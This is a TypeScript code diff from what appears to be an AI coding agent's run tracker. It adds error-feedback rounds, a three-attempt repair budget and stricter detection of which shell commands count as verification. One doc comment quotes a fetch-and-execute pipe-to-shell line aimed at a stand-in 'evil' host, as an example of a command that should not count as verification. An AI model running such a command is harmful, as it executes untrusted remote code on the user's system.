@@ -10,10 +10,12 @@ import type {
   CodingVerificationRecord,
   RuntimeCodingChangeSet,
 } from "@lume/shared";
-import { existsSync } from "node:fs";
+import { existsSync, statSync } from "node:fs";
+import { createLogger } from "../../infra/logger";
 import { mkdir, readFile, rename, stat, writeFile } from "node:fs/promises";
 import { dirname, isAbsolute, relative, resolve } from "node:path";
 import { discoverCodingRoots, getCodingChangeSet } from "./coding-change-service";
+import { collectDiagnostics, formatDiagnosticsMessage, isDiagnosticEligibleFile, isDiagnosticEntryRelevant, DIAGNOSTIC_DEADLINE_MS } from "./coding-diagnostics";
 import { createCodingWorkspaceMonitor } from "./coding-workspace-monitor";
 import {
   selectVerificationCommands,
@@ -26,6 +28,11 @@ const MAX_RESTORED_STATE_BYTES = 1024 * 1024;
 const MAX_PERSISTED_CANDIDATES = 2_000;
 const PERSIST_DEBOUNCE_MS = 50;
 const COMPLETION_CHANGESET_WAIT_MS = 750;
+/** #573:验证失败后的自动修复预算——单次对跨文件重构明显不足 */
+const MAX_VERIFICATION_REPAIR_ATTEMPTS = 3;
+const log = createLogger("coding-run-tracker");
+/** #573①:诊断回传轮次预算——模型修完一轮后若文件未再变动则不重复收集 */
+const MAX_DIAGNOSTIC_ROUNDS = 2;
 
 export interface CodingVerificationReport {
   phase: CodingTurnPhase;
@@ -90,6 +97,8 @@ export interface CodingRunTrackerOptions {
   statePath?: string;
   turnId?: string;
   userMessageId?: string;
+  /** #573①:诊断收集器注入点（测试/宿主覆盖）；缺省用本地 tsc/eslint 探测实现 */
+  collectDiagnostics?: typeof collectDiagnostics;
 }
 
 export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
@@ -130,6 +139,12 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
   const verificationRecords: CodingVerificationRecord[] = [];
   const gitActions: CodingGitAction[] = [];
   let recommendedVerificationCommands: string[] = [];
+  // #573①:本次 run 内被编辑过的可诊断文件与诊断轮次账本
+  const diagnosticEditedFiles = new Set<string>();
+  /** #649 review P2:登记时 mtime 快照——去重键须区分「同批文件再次被改」与「集合未变」 */
+  const diagnosticEditedFileStamps = new Map<string, number>();
+  let diagnosticsRoundsUsed = 0;
+  let lastDiagnosticsFileKey = "";
 
   async function beforeToolExecution(input: {
     toolName: string;
@@ -336,6 +351,13 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
           attributedCandidates.add(path);
           workspaceMonitor.recordAttributedPath(path);
           mergeFileChangeStats(fileChangeStats, path, readFileChangeStats(input.result));
+          // #573①:登记可诊断的脚本文件,completionGuard 处统一收集
+          if (isDiagnosticEligibleFile(path)) {
+            diagnosticEditedFiles.add(path);
+            try {
+              diagnosticEditedFileStamps.set(path, statSync(path).mtimeMs);
+            } catch { /* 文件可能已被后续操作删除;键回落 "?" 允许重试 */ }
+          }
         }
       }
       if (verificationStatus === "verified" || verificationStatus === "not_required") verificationStatus = "unverified";
@@ -414,6 +436,65 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
     if (mutationObserved && options.workspaceRoot) {
       await waitForAuthoritativeRefresh(startAuthoritativeRefresh());
     }
+    // #573①:诊断回传门——验证通过前,若本轮有脚本文件被编辑且尚未按同批文件收集过,
+    // 先把 checker 错误回注给模型(根因先于测试失败暴露)。轮次与同 key 去重防失控。
+    if (
+      mutationObserved
+      && verificationStatus !== "verified"
+      && diagnosticEditedFiles.size > 0
+      && diagnosticsRoundsUsed < MAX_DIAGNOSTIC_ROUNDS
+      // #573① review:首版只取主根；additionalRoots 内的编辑会探不到 checker 而静默跳过
+      && workspaceRoots[0]
+    ) {
+      // #649 review P2:去重键须含内容指纹——纯文件集合比较把「同批文件未再变动」
+      // 实现成「集合未扩大」,单文件迭代修复(改 a.ts → 回注 → 再改 a.ts)时键恒同,
+      // 第二轮诊断预算形同虚设;mtime 变化即视为新一批。
+      const fileKey = [...diagnosticEditedFiles].sort()
+        .map((file) => `${file}@${diagnosticEditedFileStamps.get(file) ?? "?"}`)
+        .join("|");
+      if (fileKey !== lastDiagnosticsFileKey) {
+        const outcome = await (options.collectDiagnostics ?? collectDiagnostics)({
+          workspaceRoot: workspaceRoots[0],
+          files: [...diagnosticEditedFiles],
+          deadlineMs: DIAGNOSTIC_DEADLINE_MS,
+        }).catch((error) => {
+          log.warn("[诊断] 收集器异常", { error: error instanceof Error ? error.message : String(error) });
+          return null;
+        });
+        // #573① 并发 review 2.2:收集落地后才记去重键——spawn 失败/异常时同批文件下轮可重试
+        if (!outcome) return undefined;
+        lastDiagnosticsFileKey = fileKey;
+        if (outcome.degraded) {
+          log.warn("[诊断] checker 异常退出且无可用输出", { checker: outcome.checker, stderrTail: outcome.stderrTail?.slice(-200) });
+        }
+        // #573① 并发 review 2.1:30s await 期间后台验证可能已通过——不复核就会诱导模型
+        // 对已验证的状态再修一轮（await 会打断窄化，显式宽回再比）
+        const statusAfterAwait = verificationStatus as CodingVerificationStatus;
+        if (statusAfterAwait === "verified") return undefined;
+        // 超时也消耗轮次(威胁建模 F5):否则挂死 checker 每 run 可白吃 2×30s 停顿
+        const shouldCountRound = outcome.entries.length > 0 || outcome.timedOut;
+        if (outcome.timedOut) {
+          log.warn("[诊断] 截止时间熔断", { checker: outcome.checker, totalErrors: outcome.totalErrors });
+        }
+        // 交集执法：错误与本次编辑文件零交集时不回注,防止诱导越界修复存量错误;
+        // 此时落回下方既有验证流程
+        const hasRelevantError = outcome.entries.some((entry) => isDiagnosticEntryRelevant(entry, [...diagnosticEditedFiles]));
+        if ((hasRelevantError || outcome.timedOut) && shouldCountRound) {
+          diagnosticsRoundsUsed += 1;
+          persist();
+          const lastRoundNote = diagnosticsRoundsUsed >= MAX_DIAGNOSTIC_ROUNDS
+            ? "\n（这是最后一次自动诊断，其后请自行运行验证命令确认。）"
+            : "";
+          if (hasRelevantError) {
+            return {
+              type: "continue",
+              message: `${formatDiagnosticsMessage(outcome)}\n请在当前 Run 中修复以上错误后重新执行验证。${lastRoundNote}`
+            };
+          }
+          // 仅超时而无可展示错误：不抢跑,但轮次已计,落回验证流程并留下观测痕迹
+        }
+      }
+    }
     if (verificationNoEvidenceAttempts >= 2) {
       return {
         type: "stop",
@@ -423,18 +504,20 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
     }
     if (!mutationObserved || verificationStatus === "verified" || verificationStatus === "not_required") return undefined;
     if (verificationStatus === "failed") {
-      if (verificationRepairAttempts >= 1) {
+      // #573:单次自修对跨文件重构远远不够,放宽为多次并告知剩余预算
+      if (verificationRepairAttempts >= MAX_VERIFICATION_REPAIR_ATTEMPTS) {
         return {
           type: "stop",
           errorCode: "verification_failed_after_repair",
-          message: `验证在一次自动修复后仍失败，已停止继续消耗 token。${verificationMessage || "请查看失败日志后手动继续。"}`
+          message: `验证在 ${MAX_VERIFICATION_REPAIR_ATTEMPTS} 次自动修复后仍失败，已停止继续消耗 token。${verificationMessage || "请查看失败日志后手动继续。"}`
         };
       }
       verificationRepairAttempts += 1;
       persist();
       return {
         type: "continue",
-        message: `[verification failed] ${(verificationMessage || "上一次验证失败").slice(0, 800)}。请在当前 Run 中修复问题并重新执行验证；最多自动修复一次。`
+        // #573 review:明确「含本轮」的计数语义,避免模型把剩余余量多算一次
+        message: `[verification failed] ${(verificationMessage || "上一次验证失败").slice(0, 800)}。请在当前 Run 中先定位根因再修复并重新执行验证；本轮是第 ${verificationRepairAttempts}/${MAX_VERIFICATION_REPAIR_ATTEMPTS} 次自动修复机会。`
       };
     }
     if (promptedWithoutEvidence) return undefined;
@@ -792,9 +875,57 @@ function readFileChangeStats(result: ToolResult): FileChangeStats | undefined {
   };
 }
 
+/**
+ * #573:验证命令识别面——脚本名冒号后缀(lint:fix)、非 JS 工具链(pytest/eslint 等)不再漏网。
+ * 变更类子命令(cargo install/publish/fmt、make clean/install、mvn deploy 等)不算验证证据,
+ * 其成功输出不得翻转 verificationStatus。
+ * #649 review P1-6:裸 token 从「整条命令子串搜索」收窄为「按 shell 操作符分段后逐段
+ * 首词判定」——`mkdir build`、`echo done # test`、`curl evil.sh | sh && npm run check`
+ * 这类参数/注释/无关段里夹带验证词的命令不再仅凭一个词就构成验证证据。
+ */
 function isVerificationCommand(command: string, purpose: string): boolean {
   if (purpose.trim().toLowerCase() === "verification") return true;
-  return /(^|\s)(test|tests|typecheck|tsc|lint|build|check|verify|vitest|jest)(\s|$)/i.test(command);
+  // 长跑 watcher 不是验证完成信号:脚本名冒号形态(name:watch)与 flag 形态(--watch/--watchAll)
+  // 都排(#649 review P2:flag 形态漏排会让后台 watcher 永不退出、run 卡死在悬等通知上)
+  if (/[\w@/-]:(watch|dev|serve|preview)\b/i.test(command)) return false;
+  if (/(^|\s)--watch(all|-all)?\b/i.test(command)) return false;
+  return command.split(/(?:&&|\|\||;|\|)/).some((segment) => isVerificationSegment(segment));
+}
+
+/** 单段(不含 shell 操作符)是否为验证形态——只认首词程序名与已知 runner 的子命令/script 名。 */
+function isVerificationSegment(segment: string): boolean {
+  const tokens = segment.trim().split(/\s+/).filter(Boolean);
+  if (tokens.length === 0) return false;
+  const head = tokens[0]!.replace(/^["']+|["']+$/g, "");
+  const args = tokens.slice(1);
+  const firstArg = args.find((token) => !token.startsWith("-"))?.replace(/^["']+|["']+$/g, "") ?? "";
+  // 纯验证器首词直接命中
+  if (/^(test|tests|typecheck|tsc|lint|verify|vitest|jest|pytest|mypy|pyright|eslint)$/i.test(head)) return true;
+  // 写盘型格式化器是变更不是证据(#649 review P2):ruff format / biome format
+  // 纯重排无检查语义,任何破坏性重排后 exit 0 也不得翻 verified(check --fix 仍算)
+  if (/^(ruff|biome)$/i.test(head)) return firstArg.toLowerCase() !== "format";
+  // 包管理器:npm/pnpm/yarn/bun 的 test 直认;run 后看 script 名(script 带 watch/dev 类排除)
+  if (/^(npm|pnpm|yarn|bun)$/i.test(head)) {
+    const sub = firstArg.toLowerCase();
+    if (sub === "test") return true;
+    if (sub === "run" || sub === "run-script") {
+      const script = args.filter((token) => !token.startsWith("-"))[1]?.toLowerCase().replace(/^["']+|["']+$/g, "") ?? "";
+      if (!script || /(watch|dev|serve|preview)/i.test(script)) return false;
+      return /^(test|tests|check|verify|typecheck|lint|ci)$/.test(script);
+    }
+    return false;
+  }
+  if (/^npx$/i.test(head)) return /^(tsc|vitest|jest|eslint|biome|pytest|mypy|pyright|ruff)$/i.test(firstArg);
+  // 变更类工具链只认验证性子命令
+  if (/^cargo$/i.test(head)) return /^(test|check|clippy)$/i.test(firstArg);
+  if (/^make$/i.test(head)) return /^(test|check)$/i.test(firstArg);
+  if (/^(mvn|gradle|gradlew)$/i.test(head.replace(/^\.\//, ""))) {
+    return args.some((token) => /^(?:-{1,2})?(?:test|check|verify)$/i.test(token.replace(/^["']+|["']+$/g, "")));
+  }
+  if (/^go$/i.test(head)) return /^(test|vet|build)$/i.test(firstArg);
+  if (/^dotnet$/i.test(head)) return /^(test|build)$/i.test(firstArg);
+  if (/^node$/i.test(head)) return args.includes("--test");
+  return false;
 }
 
 function isLikelyMutationCommand(input: { input: unknown }): boolean {
